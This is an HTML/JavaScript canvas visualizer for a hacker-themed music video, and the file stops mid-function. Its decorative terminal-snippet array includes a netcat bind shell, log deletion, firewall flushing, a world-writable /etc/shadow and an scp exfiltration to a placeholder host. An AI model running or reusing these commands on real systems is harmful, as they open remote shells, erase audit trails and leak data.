<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacking the Mainframe — Music Video</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        html, body {
            width: 100%; height: 100%;
            overflow: hidden;
            background: #000;
            color: #00ff00;
            font-family: 'JetBrains Mono', monospace;
        }
        #viz-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            display: block;
            cursor: pointer;
        }
        .play-overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 20;
            background: rgba(0,0,0,0.92);
            cursor: pointer;
            transition: opacity 0.5s;
        }
        .play-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .play-title {
            font-size: clamp(20px, 5vw, 48px);
            font-weight: 700;
            letter-spacing: 0.08em;
            text-transform: uppercase;
            color: #00ff00;
            text-shadow: 0 0 30px rgba(0,255,0,0.6), 0 0 60px rgba(0,255,0,0.3);
            margin-bottom: 12px;
        }
        .play-sub {
            font-size: clamp(12px, 2vw, 18px);
            color: rgba(0,255,0,0.5);
            margin-bottom: 40px;
        }
        .play-btn {
            width: 80px; height: 80px;
            border: 3px solid #00ff00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulse 2s ease-in-out infinite;
        }
        .play-btn::after {
            content: '';
            display: block;
            width: 0; height: 0;
            border-style: solid;
            border-width: 18px 0 18px 30px;
            border-color: transparent transparent transparent #00ff00;
            margin-left: 6px;
        }
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 0 0 rgba(0,255,0,0.4); }
            50% { box-shadow: 0 0 0 20px rgba(0,255,0,0); }
        }
        .back-link {
            position: fixed;
            top: 12px; left: 12px;
            z-index: 30;
            color: rgba(0,255,0,0.4);
            text-decoration: none;
            font-size: 13px;
            padding: 6px 10px;
            border-radius: 6px;
            background: rgba(0,0,0,0.4);
            transition: color 0.2s;
        }
        .back-link:hover { color: rgba(0,255,0,0.8); }
    </style>
</head>
<body>
    <a href="music-videos/index.html" class="back-link">&larr; Music Videos</a>
    <canvas id="viz-canvas"></canvas>
    <div class="play-overlay" id="play-overlay">
        <div class="play-title">Hacking the Mainframe</div>
        <div class="play-sub">a terminal intrusion music video</div>
        <div class="play-btn"></div>
    </div>

    <script src="../audio-tracker/playback-engine.js"></script>
    <script src="engine.js"></script>
    <script>
    // ── Hacking the Mainframe Video Renderer ──────────────────────────
    window.Renderers['hacking-mainframe-video'] = (function() {
        "use strict";

        var W = 0, H = 0;
        var analysis = null;

        // ── Colors ──
        var BG = '#000000';
        var GREEN = '#00ff00';
        var DARK_GREEN = '#005500';
        var CYAN = '#00ffff';
        var RED = '#ff2222';
        var AMBER = '#ffaa00';
        var WHITE = '#ffffff';

        // ── State ──
        var lastBeat = -1;
        var beatPulse = 0;
        var flashAlpha = 0;
        var sectionMood = 'recon';
        var lastSeqIndex = -1;
        var elapsed = 0;

        // Matrix rain columns
        var rainColumns = [];
        var RAIN_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*{}[]<>/\\|~^`.:;!?+=';

        // Network nodes
        var nodes = [];
        var nodeConnections = [];
        var targetNode = -1;

        // Firewall barriers
        var firewallBars = [];
        var firewallHealth = 1;
        var firewallFlash = 0;

        // Data packets (particles)
        var packets = [];

        // Terminal lines (scrolling code)
        var termLines = [];
        var termScrollSpeed = 1;
        var termY = 0;

        // Progress bar
        var progressValue = 0;
        var progressTarget = 0;
        var progressLabel = '';

        // Scan lines / sweep
        var scanAngle = 0;
        var scanActive = false;

        // Title
        var titleAlpha = 0;
        var titleTarget = 0;
        var titleGlitch = 0;

        // Trace detection
        var traceLevel = 0;
        var traceFlash = 0;
        var alarmPulse = 0;

        // Encryption viz
        var cryptBlocks = [];

        // Access granted flash
        var accessGranted = false;
        var accessTimer = 0;

        // Section transition flash
        var sectionFlash = 0;

        // ── Code snippets for terminal ──
        var CODE_SNIPPETS = [
            'nmap -sV -O 192.168.1.0/24',
            'ssh root@mainframe.corp -p 2222',
            'SELECT * FROM credentials WHERE admin=1;',
            'chmod 777 /etc/shadow',
            'cat /proc/cpuinfo | grep "model name"',
            'iptables -F && iptables -X',
            'python3 exploit.py --target 10.0.0.1',
            'hashcat -m 1000 -a 0 hashes.txt rockyou.txt',
            'tcpdump -i eth0 port 443',
            'curl -X POST https://api.target/upload -d @payload.bin',
            'openssl enc -aes-256-cbc -d -in vault.enc',
            'rm -rf /var/log/auth.log',
            'nc -lvp 4444 -e /bin/bash',
            'john --wordlist=/usr/share/wordlists/passwords.txt shadow',
            'hydra -l admin -P pass.txt ssh://10.0.0.1',
            'msfconsole -q -x "use exploit/multi/handler"',
            'mount /dev/sda1 /mnt/exfil',
            'tar czf data.tar.gz /mnt/exfil/secrets/',
            'scp data.tar.gz hacker@exit-node:/drop/',
            'echo "ACCESS GRANTED" >> /var/log/intrusion.log',
            'grep -r "password" /etc/ 2>/dev/null',
            'ping -c 1 -W 1 gateway.internal',
            'traceroute mainframe.corp.internal',
            'dig @10.0.0.1 mainframe.corp.internal',
            'for i in $(seq 1 255); do ping -c 1 10.0.0.$i; done',
            'FIREWALL RULE BYPASSED',
            'DECRYPTING AES-256... [####....]',
            'BUFFER OVERFLOW DETECTED AT 0x7fff5b3e',
            'INJECTING SHELLCODE... OK',
            'PRIVILEGE ESCALATION: user -> root',
            'DOWNLOADING: classified_docs.zip [47%]',
            'TRACE DETECTED - REROUTING THROUGH TOR',
            'SPOOFING MAC ADDRESS... DONE',
            'KERNEL PANIC - INITIATING RECOVERY',
        ];

        // ── Section mapping ──
        // 30 sequences: recon -> scanning -> firewall -> brute force -> access -> extraction -> trace/escape
        function mapSection(seqIndex) {
            if (seqIndex <= 2) return 'recon';
            if (seqIndex <= 5) return 'scanning';
            if (seqIndex <= 9) return 'firewall';
            if (seqIndex <= 13) return 'bruteforce';
            if (seqIndex <= 16) return 'access';
            if (seqIndex <= 21) return 'extraction';
            if (seqIndex <= 25) return 'trace';
            if (seqIndex <= 27) return 'escape';
            return 'outro';
        }

        // ── Helpers ──
        function lerp(a, b, t) { return a + (b - a) * t; }
        function lerpExp(current, target, speed, dt) {
            return current + (target - current) * (1 - Math.exp(-speed * dt));
        }
        function randChar() { return RAIN_CHARS[Math.floor(Math.random() * RAIN_CHARS.length)]; }
        function hexToRgb(hex) {
            return {
                r: parseInt(hex.slice(1,3), 16),
                g: parseInt(hex.slice(3,5), 16),
                b: parseInt(hex.slice(5,7), 16)
            };
        }

        // ── Init matrix rain ──
        function initRain() {
            rainColumns = [];
            var fontSize = 14;
            var cols = Math.ceil(W / fontSize);
            for (var i = 0; i < cols; i++) {
                rainColumns.push({
                    x: i * fontSize,
                    y: Math.random() * H,
                    speed: 60 + Math.random() * 120,
                    chars: [],
                    length: 8 + Math.floor(Math.random() * 20),
                    fontSize: fontSize
                });
                // Pre-fill chars
                for (var j = 0; j < rainColumns[i].length; j++) {
                    rainColumns[i].chars.push(randChar());
                }
            }
        }

        // ── Init network nodes ──
        function initNodes() {
            nodes = [];
            nodeConnections = [];
            var count = 12 + Math.floor(Math.random() * 8);
            for (var i = 0; i < count; i++) {
                nodes.push({
                    x: W * 0.15 + Math.random() * W * 0.7,
                    y: H * 0.15 + Math.random() * H * 0.7,
                    radius: 4 + Math.random() * 8,
                    pulsePhase: Math.random() * Math.PI * 2,
                    compromised: false,
                    type: i === 0 ? 'entry' : (i === count - 1 ? 'mainframe' : 'node'),
                    label: i === 0 ? 'ENTRY' : (i === count - 1 ? 'MAINFRAME' : 'NODE-' + i)
                });
            }
            // Create connections (minimum spanning tree-ish + some extras)
            for (var ni = 1; ni < nodes.length; ni++) {
                // Connect to nearest previous node
                var bestDist = Infinity;
                var bestJ = 0;
                for (var nj = 0; nj < ni; nj++) {
                    var dx = nodes[ni].x - nodes[nj].x;
                    var dy = nodes[ni].y - nodes[nj].y;
                    var dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < bestDist) { bestDist = dist; bestJ = nj; }
                }
                nodeConnections.push({ from: bestJ, to: ni, active: false, packet: 0 });
                // Random extra connections
                if (Math.random() > 0.5 && ni > 2) {
                    var rj = Math.floor(Math.random() * ni);
                    nodeConnections.push({ from: rj, to: ni, active: false, packet: 0 });
                }
            }
            targetNode = nodes.length - 1;
        }

        // ── Init firewall bars ──
        function initFirewall() {
            firewallBars = [];
            var count = 8;
            for (var i = 0; i < count; i++) {
                firewallBars.push({
                    y: H * 0.1 + (H * 0.8) * (i / count),
                    health: 1,
                    width: W * 0.6,
                    x: W * 0.2,
                    flash: 0
                });
            }
            firewallHealth = 1;
        }

        // ── Init terminal lines ──
        function initTerminal() {
            termLines = [];
            for (var i = 0; i < 40; i++) {
                termLines.push({
                    text: CODE_SNIPPETS[Math.floor(Math.random() * CODE_SNIPPETS.length)],
                    color: GREEN,
                    alpha: 0.3 + Math.random() * 0.7
                });
            }
            termY = 0;
        }

        // ── Init encryption blocks ──
        function initCrypt() {
            cryptBlocks = [];
            var cols = 16;
            var rows = 8;
            var bw = W / (cols + 2);
            var bh = H / (rows + 4);
            for (var r = 0; r < rows; r++) {
                for (var c = 0; c < cols; c++) {
                    cryptBlocks.push({
                        x: bw + c * bw,
                        y: bh * 2 + r * bh,
                        w: bw * 0.85,
                        h: bh * 0.75,
                        decrypted: false,
                        char: randChar(),
                        flashTimer: 0
                    });
                }
            }
        }

        // ── Draw matrix rain ──
        function drawRain(ctx, energy, speedMult) {
            var rainAlpha = 0.4 + energy * 0.4;
            var fontSize = 14;

            for (var i = 0; i < rainColumns.length; i++) {
                var col = rainColumns[i];
                col.y += col.speed * speedMult * (1 / 60);

                if (col.y > H + col.length * fontSize) {
                    col.y = -col.length * fontSize;
                    col.length = 8 + Math.floor(Math.random() * 20);
                    col.chars = [];
                    for (var j = 0; j < col.length; j++) {
                        col.chars.push(randChar());
                    }
                }

                for (var ci = 0; ci < col.chars.length; ci++) {
                    var cy = col.y + ci * fontSize;
                    if (cy < -fontSize || cy > H + fontSize) continue;

                    var charAlpha = (ci / col.length) * rainAlpha;
                    if (ci === col.chars.length - 1) {
                        // Leading character is bright white/green
                        ctx.fillStyle = WHITE;
                        ctx.globalAlpha = rainAlpha * 0.9;
                    } else {
                        ctx.fillStyle = GREEN;
                        ctx.globalAlpha = charAlpha;
                    }
                    ctx.font = fontSize + 'px "JetBrains Mono", monospace';
                    ctx.fillText(col.chars[ci], col.x, cy);

                    // Occasionally change character
                    if (Math.random() < 0.02) {
                        col.chars[ci] = randChar();
                    }
                }
            }
            ctx.globalAlpha = 1;
        }

        // ── Draw network topology ──
        function drawNetwork(ctx, energy, beat) {
            ctx.save();

            // Draw connections
            for (var ci = 0; ci < nodeConnections.length; ci++) {
                var conn = nodeConnections[ci];
                var fromN = nodes[conn.from];
                var toN = nodes[conn.to];

                ctx.beginPath();
                ctx.moveTo(fromN.x, fromN.y);
                ctx.lineTo(toN.x, toN.y);

                if (conn.active) {
                    ctx.strokeStyle = CYAN;
                    ctx.lineWidth = 2;
                    ctx.shadowBlur = 8;
                    ctx.shadowColor = CYAN;
                } else {
                    ctx.strokeStyle = DARK_GREEN;
                    ctx.lineWidth = 1;
                    ctx.shadowBlur = 0;
                }
                ctx.globalAlpha = 0.5 + energy * 0.3;
                ctx.stroke();

                // Draw packet traveling along connection
                if (conn.active && conn.packet < 1) {
                    conn.packet += (0.5 + energy) * (1 / 60);
                    var px = lerp(fromN.x, toN.x, conn.packet);
                    var py = lerp(fromN.y, toN.y, conn.packet);
                    ctx.fillStyle = CYAN;
                    ctx.shadowBlur = 12;
                    ctx.shadowColor = CYAN;
                    ctx.globalAlpha = 1;
                    ctx.beginPath();
                    ctx.arc(px, py, 3, 0, Math.PI * 2);
                    ctx.fill();
                }
            }

            // Draw nodes
            for (var ni = 0; ni < nodes.length; ni++) {
                var n = nodes[ni];
                var pulse = Math.sin(n.pulsePhase + elapsed * 3) * 0.3;
                var r = n.radius + pulse * 2 + beatPulse * 3;

                ctx.beginPath();
                ctx.arc(n.x, n.y, r, 0, Math.PI * 2);

                if (n.compromised) {
                    ctx.fillStyle = n.type === 'mainframe' ? RED : CYAN;
                    ctx.shadowBlur = 15;
                    ctx.shadowColor = n.type === 'mainframe' ? RED : CYAN;
                } else if (n.type === 'mainframe') {
                    ctx.fillStyle = AMBER;
                    ctx.shadowBlur = 12;
                    ctx.shadowColor = AMBER;
                } else if (n.type === 'entry') {
                    ctx.fillStyle = GREEN;
                    ctx.shadowBlur = 10;
                    ctx.shadowColor = GREEN;
                } else {
                    ctx.fillStyle = DARK_GREEN;
                    ctx.shadowBlur = 4;
                    ctx.shadowColor = GREEN;
                }
                ctx.globalAlpha = 0.7 + energy * 0.3;
                ctx.fill();

                // Label
                ctx.font = '9px "JetBrains Mono", monospace';
                ctx.fillStyle = n.compromised ? CYAN : GREEN;
                ctx.globalAlpha = 0.5;
                ctx.textAlign = 'center';
                ctx.shadowBlur = 0;
                ctx.fillText(n.label, n.x, n.y + r + 12);
            }

            ctx.textAlign = 'left';
            ctx.restore();
        }

        // ── Draw firewall ──
        function drawFirewall(ctx, energy) {
            ctx.save();
            var centerX = W * 0.5;

            // Draw firewall label
            ctx.font = '18px "JetBrains Mono", monospace';
            ctx.fillStyle = RED;
            ctx.textAlign = 'center';
            ctx.shadowBlur = 20;
            ctx.shadowColor = RED;
            ctx.globalAlpha = 0.8 + firewallFlash * 0.2;
            ctx.fillText('[ FIREWALL ACTIVE ]', centerX, H * 0.06);

            for (var i = 0; i < firewallBars.length; i++) {
                var bar = firewallBars[i];
                if (bar.health <= 0) continue;

                var bx = bar.x;
                var by = bar.y;
                var bw = bar.width * bar.health;
                var bh = 6;

                // Glow when hit
                var flashMult = bar.flash > 0 ? 1 + bar.flash * 2 : 1;
                bar.flash *= 0.9;

                ctx.fillStyle = bar.health > 0.5 ? RED : AMBER;
                ctx.shadowBlur = 8 * flashMult;
                ctx.shadowColor = bar.health > 0.5 ? RED : AMBER;
                ctx.globalAlpha = (0.5 + energy * 0.3) * bar.health;
                ctx.fillRect(bx + (bar.width - bw) / 2, by, bw, bh);

                // Glitch fragments when damaged
                if (bar.health < 0.8 && Math.random() < 0.1) {
                    ctx.fillStyle = RED;
                    ctx.globalAlpha = 0.3;
                    var gx = bx + Math.random() * bar.width;
                    ctx.fillRect(gx, by - 2, 10 + Math.random() * 30, bh + 4);
                }
            }
            ctx.textAlign = 'left';
            ctx.restore();
        }

        // ── Draw terminal overlay ──
        function drawTerminal(ctx, energy) {
            ctx.save();
            var fontSize = 12;
            var lineH = 16;
            var margin = W * 0.05;
            var maxLines = Math.floor(H / lineH);

            ctx.font = fontSize + 'px "JetBrains Mono", monospace';

            for (var i = 0; i < termLines.length; i++) {
                var line = termLines[i];
                var y = i * lineH - termY;
                if (y < -lineH || y > H) continue;

                ctx.fillStyle = line.color;
                ctx.globalAlpha = line.alpha * (0.3 + energy * 0.4);
                ctx.fillText('> ' + line.text, margin, y + lineH);
            }

            // Blinking cursor
            if (Math.sin(elapsed * 6) > 0) {
                var cursorY = termLines.length * lineH - termY;
                if (cursorY > 0 && cursorY < H) {
                    ctx.fillStyle = GREEN;
                    ctx.globalAlpha = 0.8;
                    ctx.fillRect(margin, cursorY + 4, 8, lineH - 4);
                }
            }

            ctx.restore();
        }

        // ── Draw data packets ──
        function drawPackets(ctx, dt, energy) {
            ctx.save();
            for (var i = packets.length - 1; i >= 0; i--) {
                var p = packets[i];
                p.x += p.vx * dt;
                p.y += p.vy * dt;
                p.life -= dt;

                if (p.life <= 0 || p.x < -20 || p.x > W + 20 || p.y < -20 || p.y > H + 20) {
                    packets.splice(i, 1);
                    continue;
                }

                var alpha = Math.min(1, p.life * 2);
                ctx.fillStyle = p.color;
                ctx.shadowBlur = 6;
                ctx.shadowColor = p.color;
                ctx.globalAlpha = alpha;

                // Small rectangle or dot
                if (p.shape === 'rect') {
                    ctx.fillRect(p.x - 3, p.y - 1, 6, 3);
                } else {
                    ctx.beginPath();
                    ctx.arc(p.x, p.y, p.size || 2, 0, Math.PI * 2);
                    ctx.fill();
                }
            }
            ctx.restore();
        }

        // ── Spawn packets ──
        function spawnPackets(count, fromX, fromY, toX, toY, color) {
            for (var i = 0; i < count; i++) {
                var angle = Math.atan2(toY - fromY, toX - fromX) + (Math.random() - 0.5) * 0.8;
                var speed = 100 + Math.random() * 200;
                packets.push({
                    x: fromX + (Math.random() - 0.5) * 20,
                    y: fromY + (Math.random() - 0.5) * 20,
                    vx: Math.cos(angle) * speed,
                    vy: Math.sin(angle) * speed,
                    life: 0.5 + Math.random() * 1.5,
                    color: color || GREEN,
                    shape: Math.random() > 0.5 ? 'rect' : 'dot',
                    size: 1 + Math.random() * 3
                });
            }
        }

        // ── Draw progress bar ──
        function drawProgressBar(ctx) {
            if (!progressLabel) return;
            ctx.save();
            var bw = W * 0.4;
            var bh = 16;
            var bx = (W - bw) / 2;
            var by = H * 0.92;

            // Border
            ctx.strokeStyle = GREEN;
            ctx.lineWidth = 1;
            ctx.shadowBlur = 6;
            ctx.shadowColor = GREEN;
            ctx.globalAlpha = 0.7;
            ctx.strokeRect(bx, by, bw, bh);

            // Fill
            ctx.fillStyle = GREEN;
            ctx.globalAlpha = 0.5;
            ctx.fillRect(bx + 1, by + 1, (bw - 2) * progressValue, bh - 2);

            // Label
            ctx.font = '11px "JetBrains Mono", monospace';
            ctx.fillStyle = GREEN;
            ctx.textAlign = 'center';
            ctx.globalAlpha = 0.9;
            ctx.fillText(progressLabel + ' ' + Math.floor(progressValue * 100) + '%', W / 2, by - 6);
            ctx.textAlign = 'left';
            ctx.restore();
        }

        // ── Draw scan sweep ──
        function drawScan(ctx, energy) {
            if (!scanActive) return;
            ctx.save();
            scanAngle += (1 + energy * 2) * (1 / 60);
            var cx = W / 2;
            var cy = H / 2;
            var radius = Math.min(W, H) * 0.35;

            // Radar circle
            ctx.strokeStyle = GREEN;
            ctx.lineWidth = 1;
            ctx.globalAlpha = 0.3;
            ctx.beginPath();
            ctx.arc(cx, cy, radius, 0, Math.PI * 2);
            ctx.stroke();
            ctx.beginPath();
            ctx.arc(cx, cy, radius * 0.66, 0, Math.PI * 2);
            ctx.stroke();
            ctx.beginPath();
            ctx.arc(cx, cy, radius * 0.33, 0, Math.PI * 2);
            ctx.stroke();

            // Cross
            ctx.beginPath();
            ctx.moveTo(cx - radius, cy); ctx.lineTo(cx + radius, cy);
            ctx.moveTo(cx, cy - radius); ctx.lineTo(cx, cy + radius);
            ctx.stroke();

            // Sweep line
            var sweepX = cx + Math.cos(scanAngle) * radius;
            var sweepY = cy + Math.sin(scanAngle) * radius;
            ctx.strokeStyle = GREEN;
            ctx.lineWidth = 2;
            ctx.globalAlpha = 0.8;
            ctx.shadowBlur = 15;
            ctx.shadowColor = GREEN;
            ctx.beginPath();
            ctx.moveTo(cx, cy);
            ctx.lineTo(sweepX, sweepY);
            ctx.stroke();

            // Sweep trail (fading arc)
            ctx.globalAlpha = 0.15;
            ctx.fillStyle = GREEN;
            ctx.beginPath();
            ctx.moveTo(cx, cy);
            ctx.arc(cx, cy, radius, scanAngle - 0.5, scanAngle);
            ctx.closePath();
            ctx.fill();

            // Blips
            for (var i = 0; i < nodes.length; i++) {
                var n = nodes[i];
                var dx = n.x - cx;
                var dy = n.y - cy;
                var dist = Math.sqrt(dx * dx + dy * dy);
                if (dist < radius) {
                    var blipAngle = Math.atan2(dy, dx);
                    var angleDiff = (scanAngle - blipAngle + Math.PI * 4) % (Math.PI * 2);
                    if (angleDiff < 0.8) {
                        ctx.fillStyle = GREEN;
                        ctx.globalAlpha = 0.8 * (1 - angleDiff / 0.8);
                        ctx.beginPath();
                        ctx.arc(n.x, n.y, 4, 0, Math.PI * 2);
                        ctx.fill();
                    }
                }
            }
            ctx.restore();
        }

        // ── Draw encryption blocks ──
        function drawCryptBlocks(ctx, energy) {
            ctx.save();
            ctx.font = '14px "JetBrains Mono", monospace';
            ctx.textAlign = 'center';

            for (var i = 0; i < cryptBlocks.length; i++) {
                var b = cryptBlocks[i];
                b.flashTimer *= 0.92;

                if (b.decrypted) {
                    ctx.fillStyle = CYAN;
                    ctx.globalAlpha = 0.4 + b.flashTimer;
                    ctx.shadowBlur = b.flashTimer > 0.1 ? 12 : 0;
                    ctx.shadowColor = CYAN;
                } else {
                    ctx.fillStyle = DARK_GREEN;
                    ctx.globalAlpha = 0.3 + energy * 0.2;
                    ctx.shadowBlur = 0;
                    // Randomly flicker chars
                    if (Math.random() < 0.03) b.char = randChar();
                }
                ctx.fillRect(b.x, b.y, b.w, b.h);

                // Character
                ctx.fillStyle = b.decrypted ? '#000' : GREEN;
                ctx.globalAlpha = b.decrypted ? 0.8 : 0.6;
                ctx.fillText(b.char, b.x + b.w / 2, b.y + b.h / 2 + 5);
            }

            ctx.textAlign = 'left';
            ctx.restore();
        }

        // ── Draw title ──
        function drawTitle(ctx) {
            if (titleAlpha < 0.01) return;
            ctx.save();

            var text = 'HACKING THE MAINFRAME';
            var fontSize = Math.max(16, Math.min(W * 0.04, 52));
            ctx.font = '700 ' + fontSize + 'px "JetBrains Mono", monospace';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';

            var y = H * 0.12;

            // Glitch effect
            if (titleGlitch > 0) {
                var glitchOff = (Math.random() - 0.5) * titleGlitch * 20;
                // Red channel offset
                ctx.fillStyle = RED;
                ctx.globalAlpha = titleAlpha * 0.5 * titleGlitch;
                ctx.fillText(text, W / 2 + glitchOff, y);
                // Cyan channel offset
                ctx.fillStyle = CYAN;
                ctx.globalAlpha = titleAlpha * 0.5 * titleGlitch;
                ctx.fillText(text, W / 2 - glitchOff, y);
            }

            // Main text
            ctx.fillStyle = GREEN;
            ctx.globalAlpha = titleAlpha;
            ctx.shadowBlur = 30;
            ctx.shadowColor = GREEN;
            ctx.fillText(text, W / 2, y);

            ctx.textAlign = 'left';
            ctx.restore();
        }

        // ── Draw trace alert ──
        function drawTraceAlert(ctx) {
            if (traceLevel <= 0) return;
            ctx.save();

            // Red border pulse
            var borderAlpha = traceLevel * 0.3 * (0.5 + Math.sin(elapsed * 8) * 0.5);
            ctx.strokeStyle = RED;
            ctx.lineWidth = 4;
            ctx.globalAlpha = borderAlpha;
            ctx.shadowBlur = 20;
            ctx.shadowColor = RED;
            ctx.strokeRect(2, 2, W - 4, H - 4);

            // TRACE DETECTED text
            if (traceLevel > 0.5) {
                ctx.font = '24px "JetBrains Mono", monospace';
                ctx.textAlign = 'center';
                ctx.fillStyle = RED;
                ctx.globalAlpha = traceLevel * (0.5 + Math.sin(elapsed * 12) * 0.5);
                ctx.shadowBlur = 30;
                ctx.shadowColor = RED;
                ctx.fillText('! TRACE DETECTED !', W / 2, H * 0.5);
            }

            ctx.textAlign = 'left';
            ctx.restore();
        }

        // ── Draw access granted ──
        function drawAccessGranted(ctx) {
            if (!accessGranted || accessTimer <= 0) return;
            ctx.save();

            ctx.font = '700 ' + Math.min(W * 0.06, 64) + 'px "JetBrains Mono", monospace';
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            ctx.fillStyle = CYAN;
            ctx.globalAlpha = Math.min(1, accessTimer);
            ctx.shadowBlur = 40;
            ctx.shadowColor = CYAN;
            ctx.fillText('ACCESS GRANTED', W / 2, H / 2);

            ctx.textAlign = 'left';
            ctx.restore();
        }

        // ── Draw scanlines (CRT effect) ──
        function drawScanlines(ctx) {
            ctx.save();
            ctx.fillStyle = 'rgba(0,0,0,0.06)';
            for (var y = 0; y < H; y += 3) {
                ctx.fillRect(0, y, W, 1);
            }
            ctx.restore();
        }

        // ── Draw flash ──
        function drawFlash(ctx) {
            if (flashAlpha < 0.01 && sectionFlash < 0.01) return;
            ctx.save();
            ctx.globalAlpha = Math.max(flashAlpha, sectionFlash);
            ctx.fillStyle = sectionFlash > flashAlpha ? GREEN : WHITE;
            ctx.fillRect(0, 0, W, H);
            ctx.restore();
        }

        // ── Draw vignette ──
        function drawVignette(ctx) {
            ctx.save();
            var grad = ctx.createRadialGradient(W / 2, H / 2, W * 0.25, W / 2, H / 2, W * 0.7);
            grad.addColorStop(0, 'rgba(0,0,0,0)');
            grad.addColorStop(1, 'rgba(0,0,0,0.6)');
            ctx.fillStyle = grad;
            ctx.fillRect(0, 0, W, H);
            ctx.restore();
        }

        // ── Node compromise logic (progressive on beats) ──
        var compromiseIndex = 0;

        function compromiseNextNode() {
            if (compromiseIndex < nodes.length) {
                nodes[compromiseIndex].compromised = true;
                // Activate connections to this node
                for (var i = 0; i < nodeConnections.length; i++) {
                    if (nodeConnections[i].to === compromiseIndex || nodeConnections[i].from === compromiseIndex) {
                        nodeConnections[i].active = true;
                        nodeConnections[i].packet = 0;
                    }
                }
                // Spawn packets from newly compromised node
                if (compromiseIndex > 0) {
                    var prevN = nodes[compromiseIndex - 1];
                    var currN = nodes[compromiseIndex];
                    spawnPackets(8, prevN.x, prevN.y, currN.x, currN.y, CYAN);
                }
                compromiseIndex++;
            }
        }

        // ── Init ──
        function init(ctx, width, height, anal) {
            W = width; H = height;
            analysis = anal;
            initRain();
            initNodes();
            initFirewall();
            initTerminal();
            initCrypt();
            packets = [];
            lastBeat = -1;
            beatPulse = 0;
            flashAlpha = 0;
            sectionMood = 'recon';
            lastSeqIndex = -1;
            elapsed = 0;
            titleAlpha = 0;
            titleTarget = 0;
            titleGlitch = 0;
            traceLevel = 0;
            accessGranted = false;
            accessTimer = 0;
            compromiseIndex = 0;
            progressValue = 0;
            progressTarget = 0;
            progressLabel = '';
            scanActive = false;
            scanAngle = 0;
            sectionFlash = 0;
            firewallHealth = 1;
        }

        // ── Resize ──
        function resize(width, height) {
            W = width; H = height;
            initRain();
        }

        // ── Render ──
        function render(frameData) {
            var ctx = frameData.ctx;
            var dt = frameData.dt || 1 / 60;
            var cursor = frameData.cursor;

            elapsed += dt;

            // Background
            ctx.fillStyle = BG;
            ctx.fillRect(0, 0, W, H);

            if (!cursor) {
                // Idle: slow rain
                drawRain(ctx, 0.2, 0.5);
                drawScanlines(ctx);
                drawVignette(ctx);
                return;
            }

            var beat = cursor.beat;
            var seqIdx = cursor.seqIndex;
            var energy = analysis ? (analysis.energy[cursor.timelineIndex] || 0) : 0;

            // ── Section transitions ──
            var newSection = mapSection(seqIdx);
            if (seqIdx !== lastSeqIndex) {
                var oldSection = sectionMood;
                sectionMood = newSection;

                if (newSection !== oldSection) {
                    sectionFlash = 0.2;

                    // Section-specific triggers
                    if (newSection === 'scanning') {
                        scanActive = true;
                        progressLabel = 'SCANNING NETWORK';
                        progressTarget = 0;
                        nodes[0].compromised = true;
                        compromiseIndex = 1;
                    }
                    if (newSection === 'firewall') {
                        scanActive = false;
                        progressLabel = 'BREACHING FIREWALL';
                        progressTarget = 0;
                        initFirewall();
                    }
                    if (newSection === 'bruteforce') {
                        progressLabel = 'BRUTE FORCE ATTACK';
                        progressTarget = 0;
                        initCrypt();
                    }
                    if (newSection === 'access') {
                        accessGranted = true;
                        accessTimer = 3;
                        sectionFlash = 0.5;
                        progressLabel = '';
                        // Compromise mainframe
                        if (nodes.length > 0) {
                            nodes[nodes.length - 1].compromised = true;
                        }
                    }
                    if (newSection === 'extraction') {
                        accessGranted = false;
                        progressLabel = 'EXTRACTING DATA';
                        progressTarget = 0;
                    }
                    if (newSection === 'trace') {
                        traceLevel = 0.3;
                        progressLabel = 'TRACE DETECTED';
                        progressTarget = 0;
                    }
                    if (newSection === 'escape') {
                        traceLevel = 1;
                        progressLabel = 'DISCONNECTING';
                        progressTarget = 0;
                        sectionFlash = 0.4;
                    }
                    if (newSection === 'outro') {
                        traceLevel = 0;
                        progressLabel = '';
                        accessGranted = false;
                    }
                }

                lastSeqIndex = seqIdx;
            }

            // ── Beat events ──
            if (beat !== lastBeat) {
                beatPulse = 1;

                // Add terminal line on each beat
                var newLine = CODE_SNIPPETS[Math.floor(Math.random() * CODE_SNIPPETS.length)];
                var lineColor = GREEN;
                if (sectionMood === 'trace' || sectionMood === 'escape') lineColor = RED;
                else if (sectionMood === 'access') lineColor = CYAN;
                termLines.push({ text: newLine, color: lineColor, alpha: 0.5 + Math.random() * 0.5 });
                if (termLines.length > 100) termLines.shift();

                // Section-specific beat actions
                if (sectionMood === 'scanning') {
                    progressTarget = Math.min(1, progressTarget + 0.08);
                    if (Math.random() > 0.5) compromiseNextNode();
                    spawnPackets(3, W * 0.1, H * 0.5, W * 0.9, H * 0.5, GREEN);
                }

                if (sectionMood === 'firewall') {
                    progressTarget = Math.min(1, progressTarget + 0.06);
                    // Hit random firewall bar
                    var hitIdx = Math.floor(Math.random() * firewallBars.length);
                    var hitBar = firewallBars[hitIdx];
                    if (hitBar.health > 0) {
                        hitBar.health -= 0.15 + energy * 0.1;
                        hitBar.flash = 1;
                        firewallFlash = 0.5;
                        spawnPackets(6, W * 0.1, hitBar.y, hitBar.x, hitBar.y, RED);
                    }
                    firewallHealth = 0;
                    for (var fi = 0; fi < firewallBars.length; fi++) {
                        firewallHealth += Math.max(0, firewallBars[fi].health);
                    }
                    firewallHealth /= firewallBars.length;
                    if (energy > 0.6) flashAlpha = 0.08;
                }

                if (sectionMood === 'bruteforce') {
                    progressTarget = Math.min(1, progressTarget + 0.05);
                    // Decrypt random blocks
                    var decryptCount = 2 + Math.floor(energy * 4);
